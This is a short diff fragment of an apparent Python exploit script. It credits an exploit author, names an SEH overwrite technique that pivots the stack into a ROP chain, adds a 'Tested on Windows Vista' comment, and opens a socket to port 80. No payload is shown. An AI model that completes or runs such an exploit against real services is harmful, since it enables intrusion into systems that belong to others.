@@ -2,6 +2,7 @@ import socket, struct
 
 # Exploit author ihack4falafel
 # SEH Trick -> ADD ESP, 1004 -> jump to ROP
+# Tested on Windows Vista
 
 s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 s.connect(("127.0.0.1", 80))
